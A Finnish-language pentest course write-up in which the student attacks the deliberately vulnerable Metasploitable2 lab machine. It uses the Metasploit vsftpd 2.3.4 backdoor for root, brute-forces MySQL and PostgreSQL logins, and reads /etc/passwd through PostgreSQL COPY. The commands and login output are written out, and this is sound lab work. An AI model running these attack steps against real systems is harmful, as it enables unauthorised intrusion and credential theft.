# H5 | Sitting ducks | Metasploit & Metasploitable2

## a) Metasploitable2 -maalikone

Laitoin host-only-networking päälle tätä varten.

Aloitetaan tiedustelu versioita skannaten top1000 porttia > `$ sudo nmap -sV metasploitable2IP`

![nmapsploit2](https://github.com/mikorpi/Pentest-2020-Autumn/blob/main/H5/images/msploit2_nmap.png)

Kuten kuvasta selviää, boksi on todella vulni. Avataan metasploitin konsoli!

Aloitin exploittaamisen katsomalla mitä haavoittuvuuksia ftp-palvelussa on. `msf6 > search vsftpd 2.3.4`. Löydetään heti takaovi exploitti. 

![ftproot](https://github.com/mikorpi/Pentest-2020-Autumn/blob/main/H5/images/ftp_root.png)

Vähintään yhtä helppoa kuin HackTheBox. Kuvassa näkyy kaikki oleellinen mitä tarvittiin eli ensinmäiseksi:
* etsitään haavoittuvuus `search`:illa.
* Asetetaan exploit `msf6 > use exploit/unix/ftp/vsftpd_234_backdoor`
* Näytetään vaihtoehdot `msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options`
* Jos kaikki kunnossa, exploitataan `exploit`-käskyllä.
* Rooted.

Seuraavaksi nappasin MYSQL-tietokantapalvelun. Versiona toimi `5.0.5` mikä on ikivanha. Samalla kaavalla mennään kuin aiemmin eli:
* `search mysql 5`-ehdolla etsitään moduuleita, näitä löyty 20 kappaletta. Valitaan `MYSQL Login Utility` mikä on bruteforce-hyökkäys.

![bfmysql5](https://github.com/mikorpi/Pentest-2020-Autumn/blob/main/H5/images/bforce_mysqlroot.png)

* `msf6 > use auxiliary/scanner/mysql/mysql_login` -> laitetaan se käyttöön.
* vaihtoehtoja on monia
* Sanalistana käytin perinteistä `rockyou.txt`:iä
* Selvisi että root:illa ei ole salasanaa.


Kokeillaan seuraavaksi toisen tietokantapalvelun kuntoa, PostgreSQL. Versiona toimii nmapin mukaan `8.3.0 - 8.3.7`. Ymmärtäisin näin kyseisen nmap-tuloksen että nmap ei ole aivan varma mikä versio se on tuolta väliltä. What gives.

Käytetään `postgres_login`:inia. `msf6 > use auxiliary/scanner/postgres/postgres_login`

```metasploit
[-] 192.168.56.102:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)
[-] 192.168.56.102:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)
[-] 192.168.56.102:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)
[-] 192.168.56.102:5432 - LOGIN FAILED: :tiger@template1 (Incorrect: Invalid username or password)
[-] 192.168.56.102:5432 - LOGIN FAILED: :postgres@template1 (Incorrect: Invalid username or password)
[-] 192.168.56.102:5432 - LOGIN FAILED: :password@template1 (Incorrect: Invalid username or password)
[-] 192.168.56.102:5432 - LOGIN FAILED: :admin@template1 (Incorrect: Invalid username or password)
[+] 192.168.56.102:5432 - Login Successful: postgres:postgres@template1
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Eli käyttäjä postgres salasanalla postgres löytyy! Mennään katsomaan, eli hyökkäyskoneella > `psql -h metasploitable2IP -U postgresql` ja salasanaksi `postgresql`.

![soppakauha](https://github.com/mikorpi/Pentest-2020-Autumn/blob/main/H5/images/superuser.png)

Katotaan käyttäjätiedot `pg_user`:ista.
* Luodaan soppakauha-käyttäjä ja annetaan sille oikeuksia!
* Mitä seuraavaksi?

Viedään vaikka `/etc/passwd` ilman shelliä.
* Luodaan taulukko > `CREATE TABLE accoinfo (acot TEXT);
* Kopioidaan `/etc/passwd` taulukkoon > `COPY accoinfo from '/etc/passwd';`
* Näytetään tulokset accoinfo-taulukosta > `select * from accoinfo where acot like '%bash%';

![acco](https://github.com/mikorpi/Pentest-2020-Autumn/blob/main/H5/images/accocopy.png)
